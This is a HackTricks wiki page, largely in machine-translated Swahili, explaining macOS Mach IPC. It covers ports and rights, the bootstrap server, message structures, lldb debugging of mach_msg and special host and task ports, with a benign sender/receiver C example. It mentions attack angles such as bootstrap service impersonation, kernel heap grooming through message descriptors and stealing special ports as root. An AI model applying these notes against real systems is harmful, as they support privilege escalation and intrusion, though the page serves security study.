# macOS IPC - Mawasiliano Kati ya Mchakato

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}

## Mawasiliano ya Mach kupitia Ports

### Taarifa za Msingi

Mach inatumia **tasks** kama **kitengo kidogo** cha kushiriki rasilimali, na kila task inaweza kuwa na **nyuzi nyingi**. Hizi **tasks na threads zimepangwa 1:1 kwa mchakato wa POSIX na nyuzi**.

Mawasiliano kati ya tasks hufanyika kupitia Mach Inter-Process Communication (IPC), ikitumia njia za mawasiliano za upande mmoja. **Ujumbe unahamishwa kati ya ports**, ambazo zinafanya kazi kama **foleni za ujumbe** zinazodhibitiwa na kernel.

**Port** ni **kipengele cha msingi** cha Mach IPC. Inaweza kutumika **kutuma ujumbe na kupokea** ujumbe.

Kila mchakato una **meza ya IPC**, ambapo inawezekana kupata **mach ports za mchakato**. Jina la mach port kwa kweli ni nambari (kiashiria kwa kitu cha kernel).

Mchakato pia unaweza kutuma jina la port lenye haki **kwa task tofauti** na kernel itafanya kuonekana kwa kuingia hii katika **meza ya IPC ya task nyingine**.

### Haki za Port

Haki za port, ambazo zinaelezea ni shughuli zipi task inaweza kufanya, ni muhimu kwa mawasiliano haya. Haki zinazowezekana za **port** ni ([mafafanuo kutoka hapa](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Haki ya Kupokea**, ambayo inaruhusu kupokea ujumbe uliopelekwa kwa port. Mach ports ni MPSC (mzalishaji mwingi, mtumiaji mmoja) foleni, ambayo inamaanisha kuwa kunaweza kuwa na **haki moja ya kupokea kwa kila port** katika mfumo mzima (kinyume na mabomba, ambapo michakato mingi inaweza kuwa na viashiria vya faili kwa mwisho wa kusoma wa bomba moja).
* **Task yenye Haki ya Kupokea** inaweza kupokea ujumbe na **kuunda Haki za Kutuma**, ikiruhusu kutuma ujumbe. Awali, **task yenyewe ina Haki ya Kupokea juu ya port yake**.
* Ikiwa mmiliki wa Haki ya Kupokea **anafariki** au kuua, **haki ya kutuma inakuwa isiyo na maana (jina la kufa).**
* **Haki ya Kutuma**, ambayo inaruhusu kutuma ujumbe kwa port.
* Haki ya Kutuma inaweza **kuigwa** hivyo task inayomiliki Haki ya Kutuma inaweza kuiga haki hiyo na **kuipa task ya tatu**.
* Kumbuka kwamba **haki za port** zinaweza pia **kupitishwa** kupitia ujumbe wa Mac.
* **Haki ya Kutuma-mara moja**, ambayo inaruhusu kutuma ujumbe mmoja kwa port na kisha inatoweka.
* Haki hii **haiwezi** **kuigwa**, lakini inaweza **kuhamishwa**.
* **Haki ya Seti ya Port**, ambayo inaashiria _seti ya port_ badala ya port moja. Kuondoa ujumbe kutoka kwa seti ya port kunamaanisha kuondoa ujumbe kutoka kwa moja ya ports inazozishikilia. Seti za port zinaweza kutumika kusikiliza kwenye ports kadhaa kwa wakati mmoja, kama `select`/`poll`/`epoll`/`kqueue` katika Unix.
* **Jina la Kufa**, ambalo si haki halisi ya port, bali ni mahali pa kuweka. Wakati port inaharibiwa, haki zote zilizopo za port kwa port hiyo zinageuka kuwa majina ya kufa.

**Tasks zinaweza kuhamisha Haki za KUTUMA kwa wengine**, na kuwapa uwezo wa kutuma ujumbe nyuma. **Haki za KUTUMA pia zinaweza kuigwa, hivyo task inaweza kuiga na kutoa haki hiyo kwa task ya tatu**. Hii, pamoja na mchakato wa kati unaojulikana kama **bootstrap server**, inaruhusu mawasiliano bora kati ya tasks.

### File Ports

File ports inaruhusu kufunga viashiria vya faili katika ports za Mac (kwa kutumia haki za port za Mach). Inawezekana kuunda `fileport` kutoka kwa FD iliyotolewa kwa kutumia `fileport_makeport` na kuunda FD kutoka kwa fileport kwa kutumia `fileport_makefd`.

### Kuanzisha mawasiliano

Kama ilivyotajwa hapo awali, inawezekana kutuma haki kwa kutumia ujumbe wa Mach, hata hivyo, **huwezi kutuma haki bila tayari kuwa na haki** ya kutuma ujumbe wa Mach. Hivyo, mawasiliano ya kwanza yanaanzishwa vipi?

Kwa hili, **bootstrap server** (**launchd** katika mac) inahusika, kwani **kila mtu anaweza kupata Haki ya KUTUMA kwa bootstrap server**, inawezekana kuomba haki ya kutuma ujumbe kwa mchakato mwingine:

1. Task **A** inaunda **port mpya**, ikipata **Haki ya KUPOKEA** juu yake.
2. Task **A**, ikiwa ni mmiliki wa Haki ya KUPOKEA, **inazalisha Haki ya KUTUMA kwa port**.
3. Task **A** inaweka **kiunganishi** na **bootstrap server**, na **inatumia Haki ya KUTUMA** kwa port ambayo ilizalisha mwanzoni.
* Kumbuka kwamba mtu yeyote anaweza kupata Haki ya KUTUMA kwa bootstrap server.
4. Task A inatuma ujumbe wa `bootstrap_register` kwa bootstrap server ili **kuunganisha port iliyotolewa na jina** kama `com.apple.taska`
5. Task **B** inashirikiana na **bootstrap server** ili kutekeleza **kuangalia bootstrap kwa jina la huduma** (`bootstrap_lookup`). Ili bootstrap server iweze kujibu, task B itatumia **Haki ya KUTUMA kwa port ambayo ilizalisha awali** ndani ya ujumbe wa kuangalia. Ikiwa kuangalia kunafanikiwa, **server inagundua Haki ya KUTUMA** iliyopokelewa kutoka Task A na **kuhamasisha kwa Task B**.
* Kumbuka kwamba mtu yeyote anaweza kupata Haki ya KUTUMA kwa bootstrap server.
6. Kwa Haki hii ya KUTUMA, **Task B** ina uwezo wa **kutuma** **ujumbe** **kwa Task A**.
7. Kwa mawasiliano ya pande mbili, kawaida task **B** inaunda port mpya yenye **Haki ya KUPOKEA** na **Haki ya KUTUMA**, na inampa **Haki ya KUTUMA kwa Task A** ili iweze kutuma ujumbe kwa TASK B (mawasiliano ya pande mbili).

Bootstrap server **haiwezi kuthibitisha** jina la huduma linalodaiwa na task. Hii inamaanisha **task** inaweza kwa urahisi **kujifanya kuwa task yoyote ya mfumo**, kama kudai kwa uwongo jina la huduma ya idhini na kisha kuidhinisha kila ombi.

Kisha, Apple inahifadhi **majina ya huduma zinazotolewa na mfumo** katika faili za usanidi salama, zilizoko katika **directories zilizolindwa na SIP**: `/System/Library/LaunchDaemons` na `/System/Library/LaunchAgents`. Pamoja na kila jina la huduma, **binary inayohusiana pia inahifadhiwa**. Bootstrap server, itaunda na kushikilia **Haki ya KUPOKEA kwa kila moja ya majina haya ya huduma**.

Kwa huduma hizi zilizopangwa, **mchakato wa kuangalia unabadilika kidogo**. Wakati jina la huduma linatafutwa, launchd inaanzisha huduma hiyo kwa njia ya kidinari. Mchakato mpya ni kama ifuatavyo:

* Task **B** inaanzisha **kuangalia bootstrap** kwa jina la huduma.
* **launchd** inakagua ikiwa task inafanya kazi na ikiwa haifanyi, **inaanzisha**.
* Task **A** (huduma) inafanya **kuangalia bootstrap** (`bootstrap_check_in()`). Hapa, **bootstrap** server inaunda Haki ya KUTUMA, inashikilia na **kuhamasisha Haki ya KUPOKEA kwa Task A**.
* launchd inagundua **Haki ya KUTUMA na kupeleka kwa Task B**.
* Task **B** inaunda port mpya yenye **Haki ya KUPOKEA** na **Haki ya KUTUMA**, na inampa **Haki ya KUTUMA kwa Task A** (huduma) ili iweze kutuma ujumbe kwa TASK B (mawasiliano ya pande mbili).

Hata hivyo, mchakato huu unatumika tu kwa tasks za mfumo zilizopangwa. Tasks zisizo za mfumo bado zinafanya kazi kama ilivyoelezwa awali, ambayo inaweza kuruhusu kujifanya.

{% hint style="danger" %}
Kwa hivyo, launchd haipaswi kamwe kuanguka au mfumo mzima utaanguka.
{% endhint %}

### Ujumbe wa Mach

[Patana na maelezo zaidi hapa](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Kazi ya `mach_msg`, ambayo kimsingi ni wito wa mfumo, inatumika kutuma na kupokea ujumbe wa Mach. Kazi hii inahitaji ujumbe utakaotumwa kama hoja ya awali. Ujumbe huu lazima uanze na muundo wa `mach_msg_header_t`, ukifuatwa na maudhui halisi ya ujumbe. Muundo umefafanuliwa kama ifuatavyo:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

The initial field **`msgh_bits`** is a bitmap:

* First bit (most significative) is used to indicate that a message is complex (more on this below)
* The 3rd and 4th are used by the kernel
* The **5 least significant bits of the 2nd byte** from can be used for **voucher**: another type of port to send key/value combinations.
* The **5 least significant bits of the 3rd byte** from can be used for **local port**
* The **5 least significant bits of the 4th byte** from can be used for **remote port**

Aina ambazo zinaweza kufafanuliwa katika voucher, port za ndani na za mbali ni (kutoka [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Kwa mfano, `MACH_MSG_TYPE_MAKE_SEND_ONCE` inaweza kutumika ku **onyesha** kwamba **haki ya kutuma mara moja** inapaswa kutolewa na kuhamasishwa kwa bandari hii. Inaweza pia kufafanuliwa `MACH_PORT_NULL` ili kuzuia mpokeaji kuwa na uwezo wa kujibu.

Ili kufikia **mawasiliano ya pande mbili** kwa urahisi, mchakato unaweza kufafanua **bandari ya mach** katika **kichwa cha ujumbe** kinachoitwa _bandari ya kujibu_ (**`msgh_local_port`**) ambapo **mpokeaji** wa ujumbe anaweza **kutuma jibu** kwa ujumbe huu.

{% hint style="success" %}
Kumbuka kwamba aina hii ya mawasiliano ya pande mbili inatumika katika ujumbe wa XPC wanaotarajia jibu (`xpc_connection_send_message_with_reply` na `xpc_connection_send_message_with_reply_sync`). Lakini **kwa kawaida bandari tofauti zinaundwa** kama ilivyoelezwa hapo awali ili kuunda mawasiliano ya pande mbili.
{% endhint %}

Sehemu nyingine za kichwa cha ujumbe ni:

* `msgh_size`: ukubwa wa pakiti nzima.
* `msgh_remote_port`: bandari ambayo ujumbe huu umetumwa.
* `msgh_voucher_port`: [vouchers za mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: ID ya ujumbe huu, ambayo inatafsiriwa na mpokeaji.

{% hint style="danger" %}
Kumbuka kwamba **ujumbe wa mach unatumwa kupitia `mach port`**, ambayo ni **mpokeaji mmoja**, **wasambazaji wengi** njia ya mawasiliano iliyojengwa ndani ya kernel ya mach. **Mchakato mwingi** unaweza **kutuma ujumbe** kwa bandari ya mach, lakini wakati wowote ni **mchakato mmoja tu unaweza kusoma** kutoka kwake.
{% endhint %}

Ujumbe kisha unaundwa na kichwa cha **`mach_msg_header_t`** kinachofuatiwa na **mwili** na **trailer** (ikiwa ipo) na inaweza kutoa ruhusa ya kujibu. Katika kesi hizi, kernel inahitaji tu kupitisha ujumbe kutoka kazi moja hadi nyingine.

**Trailer** ni **habari iliyoongezwa kwa ujumbe na kernel** (haiwezi kuwekwa na mtumiaji) ambayo inaweza kutolewa katika kupokea ujumbe kwa kutumia bendera `MACH_RCV_TRAILER_<trailer_opt>` (kuna habari tofauti ambazo zinaweza kutolewa).

#### Ujumbe Ngumu

Hata hivyo, kuna ujumbe wengine wenye **ugumu zaidi**, kama zile zinazopitisha haki za bandari za ziada au kushiriki kumbukumbu, ambapo kernel pia inahitaji kutuma vitu hivi kwa mpokeaji. Katika kesi hizi, bit muhimu zaidi ya kichwa `msgh_bits` imewekwa.

Maelezo yanayoweza kupitishwa yanafafanuliwa katika [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32bits, maelezo yote ni 12B na aina ya maelezo iko kwenye ya 11. Katika 64 bits, saizi zinatofautiana.

{% hint style="danger" %}
Kernel itakopya maelezo kutoka kazi moja hadi nyingine lakini kwanza **kuunda nakala katika kumbukumbu ya kernel**. Mbinu hii, inayojulikana kama "Feng Shui" imekuwa ikitumiwa vibaya katika exploit kadhaa ili kufanya **kernel ikope data katika kumbukumbu yake** ikifanya mchakato kutuma maelezo kwa mwenyewe. Kisha mchakato unaweza kupokea ujumbe (kernel itawachilia).

Pia inawezekana **kutuma haki za bandari kwa mchakato ulio hatarini**, na haki za bandari zitaonekana tu katika mchakato (hata kama haushughuliki nazo).
{% endhint %}

### Mac Ports APIs

Kumbuka kwamba bandari zinahusishwa na nafasi ya kazi, hivyo kuunda au kutafuta bandari, nafasi ya kazi pia inatafutwa (zaidi katika `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Unda** bandari.
* `mach_port_allocate` pia inaweza kuunda **seti ya bandari**: haki ya kupokea juu ya kundi la bandari. Kila wakati ujumbe unapopokelewa inaonyeshwa bandari kutoka ambapo ulitoka.
* `mach_port_allocate_name`: Badilisha jina la bandari (kwa chaguo-msingi nambari ya 32bit)
* `mach_port_names`: Pata majina ya bandari kutoka kwa lengo
* `mach_port_type`: Pata haki za kazi juu ya jina
* `mach_port_rename`: Badilisha jina la bandari (kama dup2 kwa FDs)
* `mach_port_allocate`: Pata mpya RECEIVE, PORT_SET au DEAD_NAME
* `mach_port_insert_right`: Unda haki mpya katika bandari ambapo una RECEIVE
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Kazi zinazotumika **kutuma na kupokea ujumbe za mach**. Toleo la overwrite linaruhusu kubainisha buffer tofauti kwa kupokea ujumbe (toleo lingine litatumia tu).

### Debug mach\_msg

Kama kazi **`mach_msg`** na **`mach_msg_overwrite`** ndizo zinazotumika kutuma na kupokea ujumbe, kuweka breakpoint juu yao kutaruhusu kukagua ujumbe zilizotumwa na kupokelewa.

Kwa mfano anza kufuatilia programu yoyote unayoweza kufuatilia kwani itapakia **`libSystem.B` ambayo itatumia kazi hii**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Ili kupata hoja za **`mach_msg`** angalia register. Hizi ndizo hoja (kutoka [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Pata thamani kutoka kwenye rejista:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Kagua kichwa cha ujumbe ukitazama hoja ya kwanza:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Aina hiyo ya `mach_msg_bits_t` ni ya kawaida sana kuruhusu jibu.



### Orodhesha bandari
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
The **jina** ni jina la default lililotolewa kwa bandari (angalia jinsi inavyo **ongezeka** katika byte 3 za kwanza). **`ipc-object`** ni **iliyofichwa** kipekee **kitambulisho** cha bandari.\
Pia angalia jinsi bandari zenye haki za **`send`** pekee zinavyokuwa **zinatambua mmiliki** wake (jina la bandari + pid).\
Pia angalia matumizi ya **`+`** kuonyesha **kazi nyingine zinazohusiana na bandari hiyo hiyo**.

Pia inawezekana kutumia [**procesxp**](https://www.newosxbook.com/tools/procexp.html) kuona pia **majina ya huduma zilizoregistriwa** (ikiwa SIP imezimwa kutokana na hitaji la `com.apple.system-task-port`):
```
procesp 1 ports
```
You can install this tool in iOS downloading it from [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Mfano wa msimbo

Kumbuka jinsi **mjumbe** **anavyotenga** bandari, kuunda **haki ya kutuma** kwa jina `org.darlinghq.example` na kuisafirisha kwa **seva ya bootstrap** wakati mjumbe alipoomba **haki ya kutuma** ya jina hilo na kuitumia **kutuma ujumbe**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## Bandari za Kipekee

Kuna bandari maalum ambazo zinaruhusu **kufanya vitendo fulani nyeti au kufikia data fulani nyeti** ikiwa kazi ina **idhini za SEND** juu yao. Hii inafanya bandari hizi kuwa za kuvutia kutoka kwa mtazamo wa mshambuliaji si tu kwa sababu ya uwezo wao bali pia kwa sababu inawezekana **kushiriki idhini za SEND kati ya kazi**.

### Bandari Maalum za Host

Bandari hizi zinawakilishwa na nambari.

**Haki za SEND** zinaweza kupatikana kwa kuita **`host_get_special_port`** na **haki za RECEIVE** kwa kuita **`host_set_special_port`**. Hata hivyo, simu zote mbili zinahitaji bandari ya **`host_priv`** ambayo ni ya ufikiaji wa root pekee. Zaidi ya hayo, katika siku za nyuma root ilikuwa na uwezo wa kuita **`host_set_special_port`** na kuiba bandari yoyote ambayo iliruhusu kwa mfano kupita saini za msimbo kwa kuiba `HOST_KEXTD_PORT` (SIP sasa inazuia hili).

Hizi zimegawanywa katika makundi 2: **bandari 7 za kwanza zinamilikiwa na kernel** ikiwa ni pamoja na 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` na 7 ni `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Zile zinazotangulia **kuanzia** nambari **8** zinamilikiwa na **daemons za mfumo** na zinaweza kupatikana zilizoelezwa katika [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).

* **Bandari ya Host**: Ikiwa mchakato una **idhini ya SEND** juu ya bandari hii anaweza kupata **taarifa** kuhusu **mfumo** kwa kuita taratibu zake kama:
* `host_processor_info`: Pata taarifa za processor
* `host_info`: Pata taarifa za host
* `host_virtual_physical_table_info`: Taarifa za meza ya ukurasa wa Virtual/Fizikia (inahitaji MACH\_VMDEBUG)
* `host_statistics`: Pata takwimu za host
* `mach_memory_info`: Pata mpangilio wa kumbukumbu ya kernel
* **Bandari ya Host Priv**: Mchakato wenye **haki ya SEND** juu ya bandari hii unaweza kufanya **vitendo vya kipekee** kama kuonyesha data za boot au kujaribu kupakia nyongeza ya kernel. **Mchakato unahitaji kuwa root** ili kupata ruhusa hii.
* Zaidi ya hayo, ili kuita API ya **`kext_request`** inahitajika kuwa na haki nyingine **`com.apple.private.kext*`** ambazo zinatolewa tu kwa binaries za Apple.
* Taratibu nyingine zinazoweza kuitwa ni:
* `host_get_boot_info`: Pata `machine_boot_info()`
* `host_priv_statistics`: Pata takwimu za kipekee
* `vm_allocate_cpm`: Pata Kumbukumbu ya Fizikia Inayoendelea
* `host_processors`: Tuma haki kwa processors za host
* `mach_vm_wire`: Fanya kumbukumbu kuwa ya kudumu
* Kwa kuwa **root** inaweza kufikia ruhusa hii, inaweza kuita `host_set_[special/exception]_port[s]` ili **kuiba bandari maalum za host au bandari za kipekee**.

Inawezekana **kuona bandari zote maalum za host** kwa kukimbia:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

Hizi ni bandari zilizohifadhiwa kwa huduma zinazojulikana. Inawezekana kupata/seti kwa kuwaita `task_[get/set]_special_port`. Zinapatikana katika `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

* **TASK\_KERNEL\_PORT**\[task-self send right]: Bandari inayotumika kudhibiti kazi hii. Inatumika kutuma ujumbe unaoathiri kazi. Hii ni bandari inayorejeshwa na **mach\_task\_self (tazama Task Ports hapa chini)**.
* **TASK\_BOOTSTRAP\_PORT**\[bootstrap send right]: Bandari ya bootstrap ya kazi. Inatumika kutuma ujumbe unaohitaji kurudi kwa bandari nyingine za huduma za mfumo.
* **TASK\_HOST\_NAME\_PORT**\[host-self send right]: Bandari inayotumika kuomba taarifa za mwenyeji anayeshikilia. Hii ni bandari inayorejeshwa na **mach\_host\_self**.
